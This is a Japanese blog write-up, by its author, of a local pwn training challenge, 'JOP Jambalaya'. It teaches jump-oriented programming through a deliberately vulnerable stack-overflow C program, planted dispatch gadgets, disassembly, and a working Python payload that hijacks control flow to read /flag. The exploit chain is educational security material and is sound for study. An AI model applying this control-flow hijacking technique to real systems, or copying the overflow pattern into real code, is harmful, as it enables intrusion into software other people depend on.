---
title: "ROPをやめて間接ジャンプでつなぐ、TofuCTF「JOP Jambalaya」でJOP入門"
emoji: "🎺"
type: "tech"
topics: ["ctf", "pwn", "security", "assembly", "linux"]
published: true
---

自分専用のpwn学習サイト「TofuCTF」では、「前問の知識にもう一度触れつつ、新しい要素を1つだけ追加する」方針で毎日ひと口ずつpwn問題を作っています。

この記事では、2026-10-05に追加した通算21問目「JOP Jambalaya」を題材に、**通常のROP（return-oriented programming）ではなく、間接ジャンプで処理をつなぐJOP（jump-oriented programming）の構造**を解説します。ソース・バイナリ・exploitはすべて公開済みのローカル演習パッケージに含まれており、記事どおりに手元で再現できます。

- TofuCTF: https://tasodoufu.github.io/TofuCTF/
- 問題パッケージ: https://github.com/tasodoufu/TofuCTF/tree/main/challenge-dist/jop-jambalaya
- Exploit: https://github.com/tasodoufu/TofuCTF/blob/main/author/exploit-jop-jambalaya.py
- 対象問題: JOP Jambalaya（ローカル amd64 / NX / Full RELRO / No PIE）

なお、この問題は自分が作者として作ったローカル演習用の問題です。大会のwriteup制限とは関係なく、作者側exploitもすでにリポジトリで公開しています。

## 問題の構造

脆弱な入力を受け付ける `take_order()` の骨格は次の通りです（作者側ソースから該当部分のみ）。

```c
static void take_order(void) {
    char recipe[48];
    puts("The jambalaya counter accepts a 48-byte recipe card.");
    (void)syscall(SYS_read, STDIN_FILENO, recipe, 512U);
    puts("Recipe filed.");
    ordinary_recipe();
}
```

48バイトのバッファに512バイト読み込む、ありふれたstack overflowです。flagの目的地は、どこからも呼ばれていない `secret_recipe()` です。

```c
static void secret_recipe(void) {
    char flag[128] = {0};
    int fd = open("/flag", O_RDONLY);
    if (fd < 0) { puts("The secret recipe is unavailable."); return; }
    ssize_t length = read(fd, flag, sizeof(flag) - 1U);
    if (length > 0) { (void)write(STDOUT_FILENO, flag, (size_t)length); }
    close(fd);
}
```

一方、バイナリ側にはasmで小さな「ディスパッチ用ガジェット」が意図的に置かれています。

```c
__asm__(
    ".global tofu_jop_entry\n"
    "tofu_jop_entry:\n"
    "    pop %r12\n"
    "    pop %r13\n"
    "    pop %r14\n"
    "    jmp *%r13\n"      /* 飛び先は r13 が決める */
    ".global tofu_jop_call\n"
    "tofu_jop_call:\n"
    "    call *%r12\n"     /* 呼び先は r12 が決める */
    "    jmp *%r14\n"      /* 戻った後の行き先は r14 が決める */
    ".global tofu_jop_finish\n"
    "tofu_jop_finish:\n"
    "    mov $60, %eax\n"  /* exit(0) */
    "    xor %edi, %edi\n"
    "    syscall\n"
);
```

緩和策は **NX / Full RELRO / No PIE** です。No PIEなのでガジェットと関数のアドレスは固定、NXなのでシェルコードは実行できません。「既存コード片をポインタでつなぐ」方向に解くことになります。

## JOPという発想

通常のROPは、スタックに積んだガジェットアドレスを`ret`命令で読み進めます。連鎖の担い手は「末尾が`ret`のガジェット」です。

JOPはその対極で、連鎖の継続を**間接ジャンプ（`jmp` / `call`）が運びます**。次の処理の選択がスタック上のリターンアドレスではなくレジスタの値（ディスパッチポインタ）で決まるのが特徴です。この攻撃モデルは元々、Bletschらによる "Jump-oriented programming: a new class of code-reuse attack"（ASIACCS 2011）で体系化され、スタックと`ret`への依存を排除しつつROPと同等の表現力を保つ手法として提示されました。またCheckowayらの "Return-Oriented Programming without Returns"（CCS 2010）は、`ret`の代わりに`pop`＋`jmp`で連鎖する同系統の攻撃を示しています。

## Exploitを組み立てる

バイナリはNo PIEなので、アドレスは実行ごとに固定です。`objdump -d`でガジェット周辺を確認します（本記事の執筆時に配布バイナリで再確認済み）。

```text
4011f6: 41 5c          pop    %r12
4011f8: 41 5d          pop    %r13
4011fa: 41 5e          pop    %r14
4011fc: 41 ff e5       jmp    *%r13
4011ff: 41 ff d4       call   *%r12
401202: 41 ff e6       jmp    *%r14
401205: b8 3c 00 00 00 mov    $0x3c,%eax
40120a: 31 ff          xor    %edi,%edi
40120c: 0f 05          syscall
401228: (secret_recipe 本体)
```

chainはスタック上に4つの歯車を並べるだけです。オフセット56は `recipe[48]` + 8バイト（アライメント等）で、実際に通ることで確認済みです。

```python
OFFSET = 56                      # recipe[48] + 8
JOP_ENTRY = 0x4011f6             # pop r12; pop r13; pop r14; jmp *r13
JOP_CALL  = 0x4011ff             # call *r12; jmp *r14
JOP_FINISH = 0x401205            # exit(0)
SECRET_RECIPE = 0x401228

payload  = b"A" * OFFSET
payload += q(JOP_ENTRY)          # 溢れたリターンアドレス: take_order から entry へ
payload += q(SECRET_RECIPE)      # → r12
payload += q(JOP_CALL)           # → r13
payload += q(JOP_FINISH)         # → r14
```

処理の流れを追うと:

1. `take_order` がreturnし、**リターンアドレスが `tofu_jop_entry`（0x4011f6）に乗り換わる**
2. entryの`pop`×3で、スタック上の残り3個の値が **r12=secret_recipe、r13=tofu_jop_call、r14=finish** に入る
3. `jmp *%r13` で **tofu_jop_call へ間接ジャンプ**（`ret`はもう使わない）
4. `call *%r12` で **secret_recipe を呼び出し、/flag が表示される**
5. secret_recipeは通常の`ret`で戻る。戻り先はcallがpushしたアドレス＝`jmp *%r14`
6. `tofu_jop_finish` が `exit(0)` で後片付け

スタックの目線で整理すると、ペイロードの4個の値は「**まずentryへ着地し、r12/r13/r14に3個のポインタを積む**」という1セットになっています。ROPが「ガジェットのアドレスを数珠つなぎに積む」のに対し、JOPでは「**ディスパッチポインタをデータとして積み、jmp/callが運ぶ**」点が本質的な違いです。

## なぜretを省けるのか

この問題で連鎖を完結させるために使う命令は次の3種だけです。

```text
ret        : take_order からの正常な復帰（1回だけ）
pop ×3     : 正常なスタック巻き戻し
jmp *reg   : switch文・関数ポインタでも普通に使われる間接ジャンプ
```

Checkowayらの "without returns" は`pop`＋`jmp`の組を`ret`の代用品として使いましたが、今回の連鎖はさらに明確で、**`ret`は最初の1回だけで、以降はすべてレジスタ経由の間接ジャンプ**です。entryガジェットが`pop`を3回行ってから飛ぶ構造こそが、連鎖の「入口」を1か所に集約しています。

正直に書くと、この問題はリターンアドレスを直接 `secret_recipe`（0x401228）に書き換えても解けてしまいます（引数不要・終了後そのままexitで筋が通るため）。しかし問題の学習目標はREADMEに書いた通り「ordinaryなROP returnに頼らずディスパッチを組む」こと。JOPの骨格を手で組んでみるのが主眼なので、あえてこの構成にしました。実世界のJOPでは、このような専用ガジェットをasmで用意するのではなく、既存ライブラリから`jmp`/`call`で終わる断片を探索してディスパッチテーブルを組み立てます。

正当な命令の組み合わせだけで連鎖が完成するため、NXやASLRのような古典的な緩和策では止まりません。対策はCFI（control-flow integrity）など「間接分岐の行き先を正当な先に限定する」系統の話につながりますが、本記事では深追いしません。冒頭の論文が出発点になります。

## 再現方法

```bash
wget https://github.com/tasodoufu/TofuCTF/raw/main/downloads/jop-jambalaya.tar.gz
tar xzf jop-jambalaya.tar.gz && cd jop-jambalaya
./run.sh
nc 127.0.0.1 31337
```

`./run.sh stop` でコンテナとflag用volumeを削除できます。flagはローカル演習用に `sha256("tofuctf-local-v1:jop-jambalaya:<binaryのsha256>")` から生成され、リポジトリには実値を含めず、`/flag` はDocker volumeとして起動時に注入されます。exploitは次の1行で通ります。

```bash
python3 author/exploit-jop-jambalaya.py 127.0.0.1 31337
```

## 学びのまとめ

- JOPは連鎖の継続を`ret`ではなく**間接ジャンプ＋ディスパッチポインタ**で運ぶ。entryガジェットが`pop`してから飛ぶ構造が「入口」を1か所に集約する
- `pop`×3＋`jmp *r13`＋`call *r12`＋`jmp *r14`の4歯車で、呼び出し→復帰→終了までを`ret`なしで完結できる
- 正当な命令（`ret`/`pop`/`jmp *reg`）の混在で成立するため、NX・ASLRでは止まらない。CFI系の防御が論点になる
- 「実は直書き換えでも解ける」問題でも、学習目標に合わせて解き方を縛ることで新しい構造の練習になる

## 参考資料

- TofuCTF（自分のpwn学習サイト）: https://tasodoufu.github.io/TofuCTF/
- TofuCTF リポジトリ（本問題のパッケージ・作者exploitを含む）: https://github.com/tasodoufu/TofuCTF
- Tyler Bletsch, Xuxian Jiang, Vince W. Freeh, Zhenkai Liang, "Jump-oriented programming: a new class of code-reuse attack", ASIACCS 2011: https://dl.acm.org/doi/10.1145/1966913.1966919
- 同論文の技術報告版（NCSU TR-2010-8）: https://techrep.csc.ncsu.edu/2010/TR-2010-8.pdf
- Stephen Checkoway et al., "Return-Oriented Programming without Returns", CCS 2010: https://dl.acm.org/doi/10.1145/1866307.1866370
- CTF Wiki — medium-rop（ROP関連の基礎まとめ）: https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/
